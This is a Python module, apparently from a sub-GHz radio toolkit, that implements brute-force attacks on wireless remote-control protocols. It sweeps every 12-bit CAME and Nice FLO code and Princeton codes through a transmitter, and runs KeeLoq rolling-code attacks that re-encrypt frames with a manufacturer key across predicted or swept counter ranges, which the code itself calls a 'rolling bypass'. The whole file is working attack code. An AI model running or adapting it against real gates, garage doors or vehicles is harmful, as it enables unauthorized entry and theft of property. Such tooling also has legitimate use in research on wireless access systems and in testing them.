"""Dynamic brute force: CAME/Nice/Princeton codes, KeeLoq counter attacks."""

from __future__ import annotations

import time
from typing import Callable, Iterable, Optional

from .keystore import Keystore
from .protocols import (CameEncoder, NiceFloEncoder, PrincetonEncoder)
from .protocols.keeloq import build_upload, counter_chain, frame_key
from .subfile import SubFile
from .tx_engine import TxEngine
from . import keeloq_tx


def frames_came(start: int, count: int) -> Iterable[int]:
    """All 12-bit CAME codes from `start` (0..4095)."""
    for code in range(int(start), int(start) + int(count)):
        yield code & 0xFFF


def frames_nice(start: int, count: int) -> Iterable[int]:
    """All 12-bit Nice FLO codes from `start`."""
    for code in range(int(start), int(start) + int(count)):
        yield code & 0xFFF


def frames_keeloq_counters(sub: SubFile, keystore: Optional[Keystore],
                           count: int, counter_mode: int = 2,
                           counter_mult: int = 1) -> Iterable[list]:
    """`count` frame uploads with predicted (or replayed) rolling counters."""
    info = keeloq_tx.analyze(sub, keystore)
    count = int(count)
    if not info.matched:
        upload = build_upload(int(sub.key), info.te)
        for _ in range(count):
            yield upload
        return
    for cnt in counter_chain(info.cnt, counter_mode, count, counter_mult):
        key = frame_key(info.man_key, info.serial, info.btn, cnt)
        yield build_upload(key, info.te)


class BruteForcer:
    """Runs code/counter attacks through a TxEngine."""

    def __init__(self, tx: TxEngine):
        self.tx = tx

    # -- fixed-code protocols ------------------------------------------------
    def run_codes(self, preset, freq: int, protocol: str, codes: Iterable[int],
                  repeat_per_code: int = 1, inter_code_gap_s: float = 0.004,
                  progress: Optional[Callable[[int, int], bool]] = None) -> int:
        """Send every code in `codes` back-to-back (CAME/Nice/Princeton)."""
        codes = list(codes)
        total = len(codes)
        sent = 0
        for index, code in enumerate(codes):
            upload = self._protocol_upload(protocol, code)
            sent += self.tx.send(preset, freq, upload,
                                 repeat=max(1, int(repeat_per_code)))
            if progress is not None and progress(index + 1, total):
                break
            if inter_code_gap_s > 0 and index + 1 < total:
                time.sleep(inter_code_gap_s)
        return sent

    @staticmethod
    def _protocol_upload(protocol: str, code: int) -> list:
        if protocol == "CAME":
            return CameEncoder(data=code, data_count_bit=12).build_upload()
        if protocol == "Nice FLO":
            return NiceFloEncoder(data=code, data_count_bit=12).build_upload()
        if protocol == "Princeton":
            return PrincetonEncoder(data=code, data_count_bit=24).build_upload()
        raise ValueError(f"unknown brute protocol {protocol!r}")

    # -- KeeLoq counter attack ---------------------------------------------------
    def run_keeloq(self, preset, freq: int, sub: SubFile,
                   keystore: Optional[Keystore], count: int = 12,
                   counter_mode: int = 2, counter_mult: int = 1,
                   progress: Optional[Callable[[int, int], bool]] = None) -> int:
        """Send `count` frames with predicted rolling counters."""
        uploads = list(frames_keeloq_counters(sub, keystore, count,
                                              counter_mode=counter_mode,
                                              counter_mult=counter_mult))
        sent = 0
        for index, upload in enumerate(uploads):
            sent += self.tx.send(preset, freq, upload, repeat=1)
            if progress is not None and progress(index + 1, len(uploads)):
                break
        return sent

    # -- KeeLoq counter-window sweep ------------------------------------------------
    def run_keeloq_sweep(self, preset, freq: int, sub: SubFile,
                         keystore: Optional[Keystore], counter_from: int,
                         counter_to: int, step: int = 1,
                         progress: Optional[Callable[[int, int], bool]] = None) -> int:
        """Re-encrypt + spray every counter in [from, to] (rolling bypass)."""
        info = keeloq_tx.analyze(sub, keystore)
        if not info.matched:
            raise ValueError(
                "counter-window sweep needs a manufacturer key — add one to "
                "assets/keeloq_keys.txt or set a known Manufacture in the .sub")
        step = max(1, int(step))
        counters = []
        cnt = int(counter_from) & 0xFFFF
        while cnt <= (int(counter_to) & 0xFFFF):
            counters.append(cnt)
            cnt += step
        sent = 0
        for index, cnt in enumerate(counters):
            key = frame_key(info.man_key, info.serial, info.btn, cnt)
            upload = build_upload(key, info.te)
            sent += self.tx.send(preset, freq, upload, repeat=1)
            if progress is not None and progress(index + 1, len(counters)):
                break
        return sent
